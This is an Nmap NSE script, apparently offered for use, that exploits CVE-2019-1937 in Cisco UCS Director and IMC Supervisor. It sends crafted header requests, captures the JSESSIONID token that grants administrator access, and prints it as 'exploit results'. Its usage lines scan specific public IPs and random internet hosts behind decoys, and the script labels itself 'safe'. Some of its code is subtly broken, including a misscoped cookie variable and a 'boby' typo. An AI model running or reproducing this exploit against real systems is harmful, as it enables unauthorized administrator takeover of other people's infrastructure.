---
-- Nmap NSE cisco-cve-2019-1937.nse - Version 1.3
-- Copy to: /usr/share/nmap/scripts/cisco-cve-2019-1937.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help cisco-cve-2019-1937.nse
-- Port(s) accepted by this nse: 80,443
--
-- Affected versions: confirmed in Cisco UCS Director versions 6.6.0 to 6.7.0
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it {Disclosure = Pedro Ribeiro}
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.

Some Syntax examples:
nmap --script-help cisco-cve-2019-1937.nse
nmap -sV -T4 -Pn -n -p 80-86,443,8080 --open --script cisco-cve-2019-1937.nse 137.44.25.194
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 137.44.25.194
nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "uri=/vdeo/cgi/loginDefaultUser,verbose=true" 137.44.25.194
nmap -sS -Pn -p 80,86 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3,verbose=true" 50.117.40.77
nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,443,8080-8086 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help cisco-cve-2019-1937.nse
-- nmap -sV -T4 -Pn -n -p 80-86,8080 --open --script cisco-cve-2019-1937.nse 137.44.25.194
-- nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 137.44.25.194
-- nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "uri=/vdeo/cgi/loginDefaultUser,verbose=true" 137.44.25.194
-- nmap -sS -Pn -p 80,86 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3,verbose=true" 50.117.40.77
-- nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,8080-8086 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3
-- @output
-- PORT     STATE SERVICE VERSION
-- 443/tcp open  https  Apache httpd 2.4.38
-- | cisco-cve-2019-1937:
-- |   VULNERABLE:
-- |   Cisco UCS Supervisor (Web Interface Auth Bypass)
-- |   State: VULNERABLE
-- |   IDs:  CVE:CVE-2019-1937
-- |   Risk factor: Critical  CVSSv2: 10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)
-- |     A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
-- |     Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
-- |     to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
-- |     is due to insufficient request header validation during the authentication process. An attacker could exploit this
-- |     vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
-- |     to use the acquired session token to gain full administrator access to the affected device.
-- |
-- |   Disclosure date: 2019-Ago-21
-- |   Exploit results:
-- |     Uri: http://192.168.1.71:443/app/ui/ClientServlet?apiName=GetUserInfo
-- |     Auth-Cookie: JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC74;
-- |     LoginAccess: admin
-- |
-- |   Referencies:
-- |     https://nvd.nist.gov/vuln/detail/CVE-2019-1937
-- |     https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby
-- |     https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html
-- |_
-- @args verbose => Display More verbose outputs      - Default: false
-- @args User-Agent => User-Agent to send in requests - Default: Android; Mobile
-- @args uri => the URL path to search in host.ip     - Default: /app/ui/ClientServlet?apiName=GetUserInfo
---


author = "r00t-3xp10it"
copyright = "Pedro Ribeiro"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "vuln"}


-- DEPENDENCIES (lua nse libs) --
local http = require "http"
local table = require "table"
local vulns = require "vulns"
local string = require "string"
local stdnse = require "stdnse" --> nse args usage
local shortport = require "shortport"


-- THE RULE SECTION --
-- Scan only the selected ports/proto/service_names in 'open state'
portrule = shortport.port_or_service({80, 443}, "http, https", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/app/ui/ClientServlet?apiName=GetUserInfo"
local verbose = stdnse.get_script_args(SCRIPT_NAME..".verbose") or "false"
local ip_addr = nil


-- Capture distro flavor { windows | Linux }
local socket = io.popen("ver 2>&1") --> supress io.popen() stdout error msg (2>&1)
flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
socket.close()
if ( flavor == nil or flavor == "" or string.find(flavor, "not found") ) then
   local socket = io.popen("uname -s")
   flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
   socket.close()
end


if (string.find(flavor, "Linux")) then
   -- Executing BASH command(s) and storing results
   -- Storing network interface in use { wlan0 | eth0 }
   local socket = io.popen("netstat -r|grep 'default'|awk {'print $8'}")
   local int_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from interface
   socket:close()
   -- Storing Internal IP address to be used in header['host'] and header['referer']
   local socket = io.popen("ifconfig "..int_addr.."|grep -m 1 'inet'|awk {'print $2'}")
   ip_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from ip addr
   socket:close()
elseif (string.find(flavor, "windows")) then
   -- Executing CMD command(s) and storing results
   -- Storing Internal IP address to be used in header['host'] and header['referer']
   local socket = io.popen("ipconfig|FINDSTR IPv4")
   ip_addr = socket:read("*a"):gsub("Autoconfiguration IPv4 Address. . : ", ""):gsub("\n", "")
   socket.close()
elseif (not(string.find(flavor, "Linux") or string.find(flavor, "windows")) and verbose == "true") then
   return "\n  Cisco UCS Supervisor (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: ["..flavor.."] not compatible operative system\n\n"
end


-- Identify servers that answer 200 to invalid HTTP requests
-- and exit as these would invalidate the next nse tests
local status_404, result_404, _ = http.identify_404(host, port)
if ( status_404 and result_404 == 200 ) then
   print("CVE-2019-1937:\n| Exiting: "..host.ip..":"..port.number..uri.." (false positive)\n|   Reason: All URIs tested return status [200] OK\n|_")
   return nil
end


if ( not(ip_addr == nil or string.find(ip_addr , "not found")) ) then
local _decoy = {header={}} --> Build TCP request 'header'
_decoy['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".User-Agent") or "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/45.0"
_decoy['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
_decoy['header']['X-Requested-With'] = "XMLHttpRequest"
_decoy['header']['Cache-Control'] = "no-store"
_decoy['header']['Host'] = ip_addr
if ( port.number == 443 ) then
   _decoy['header']['Referer'] = "https://"..ip_addr.."/"
else
   _decoy['header']['Referer'] = "http://"..ip_addr.."/"
end

   -- Grab redirection url to use on next GET request
   local response = http.get(host, port, uri, _decoy, { no_cache = true, no_cache_body = true })
   if ( not(response or response.status) ) then
      uri_stats = "none uri response"
   elseif (response and response.status == 302) then
      local redirection = response.header and response.header['Location'] or ""
      if ( not(redirection == nil or redirection == "") ) then
         if (port.number == 443) then
            uri = redirection:gsub("Location: https://", ""):gsub(ip_addr, "")
            uri_stats = "true"
         else
            uri = redirection:gsub("Location: http://", ""):gsub(ip_addr, "")
            uri_stats = "true"
         end
      else
         uri_stats = "none redirection"
      end
   else
      uri_stats = "none redirection"
   end
else
   uri_stats = "false"
end


-- Follow the redirection uri to capture Set-Cookie { auth cookie }
-- eg. JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC745; Path=/app; Secure; HttpOnly
if ( uri_stats == "true" ) then
   local res = http.get(host, port, uri, _decoy, { no_cache = true, no_cache_body = true })
   if ( not(res or res.status) ) then
      cookie_stats = "none redirection"
   elseif (res and res.status == 200) then
      local set_cookie = response.header and response.header['Set-Cookie'] or ""
      if ( not(set_cookie == nil or set_cookie == "") ) then
         local parse_cookie = set_cookie:gsub("Set-Cookie: ", ""):gsub("; Path=/app; Secure; HttpOnly", "")
         cookie_stats = "true"
      else
         cookie_stats = "none cookie"
      end
   elseif (response and response.status ~= 200) then
      cookie_stats = "wrong status code"
   end
end


-- Build Nmap vulnerable {table}
local vuln_table = {
   title = "Cisco UCS Supervisor (Web Interface Auth Bypass)",
   state = vulns.STATE.NOT_VULN,
   IDS = {CVE = 'CVE-2019-1937'},
   risk_factor = "Critical",
      scores = {
         CVSSv2 = "10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)",
      },
   description = [[
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.
]],
   references = {
     'https://nvd.nist.gov/vuln/detail/CVE-2019-1937',
     'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby',
     'https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html',
   },
   dates = {
      disclosure = {year = '2019', month = 'Ago', day = '21'},
   },
   exploit_results = {}, --> Display auth cookie and creds
}

-- Build vulnerable stdout (Display auth cookie and creds)
if (uri_stats == "true" and cookie_stats == "true") then
   table.insert(vuln_table.exploit_results, string.format("Uri: http://"..host.ip..":"..port.number..uri))
   table.insert(vuln_table.exploit_results, string.format("Auth-Cookie: "..parse_cookie))
   table.insert(vuln_table.exploit_results, string.format("LoginAccess: admin\n"))
end


   if (uri_stats == "true" and cookie_stats == "true") then
      uri = "/app/ui/ClientServlet?apiName=GetUserInfo"
      local _send = {header={}} --> Build TCP request 'header'
      _send['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".User-Agent") or "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/45.0"
      _send['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
      _send['header']['Cache-Control'] = "no-store"
      _send['header']['Host'] = ip_addr
      _send['header']['X-Requested-With'] = "XMLHttpRequest"
      _send['header']['X-Starship-UserSession-Key'] = "ssa"
      _send['header']['X-Starship-Request-Key'] = "redteam"
      _send['header']['Cookie'] = parse_cookie..";"
      if ( port.number == 443 ) then
         _send['header']['Referer'] = "https://"..ip_addr.."/"
      else
         _send['header']['Referer'] = "http://"..ip_addr.."/"
      end


      local vuln_test = http.get(host, port, uri, _send, { no_cache = true, no_cache_body = true })
      if (vuln_test and vuln_test.status == 200) then
         vuln_table.state = vulns.STATE.VULN
         local report = vulns.Report:new(SCRIPT_NAME, host, port)
         return report:make_output(vuln_table)
      elseif (vuln_test.status ~= 200 and verbose == "true") then
         return "\n  Cisco UCS Supervisor (Web Interface Auth Bypass)\n  State: [?] POSSIBLE VULNERABLE to CVE-2019-1937\n    Remark: ["..vuln_test.status.."] Host did NOT accepted header[cookie] auth\n    Response:\n"..vuln_test.boby.."\n\n"
      end

   -- Error messages { verbose=true }
   elseif (uri_stats == "none uri response" and verbose == "true") then
      return "\n  Cisco UCS Supervisor (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [001] none response received in first test\n\n"
   elseif (uri_stats == "none redirection" and verbose == "true") then
      return "\n  Cisco UCS Supervisor (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [002] none redirection found in first test\n\n"
   elseif (cookie_stats == "none redirection" and verbose == "true") then
      return "\n  Cisco UCS Supervisor (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [003] none redirection found in second test\n\n"
   elseif (cookie_stats == "none cookie" and verbose == "true") then
      return "\n  Cisco UCS Supervisor (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [004] auth cookie not found\n\n"
   elseif (cookie_stats == "wrong status code" and verbose == "true") then
      return "\n  Cisco UCS Supervisor (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [005] auth cookie wrong status code\n\n"
   end
end
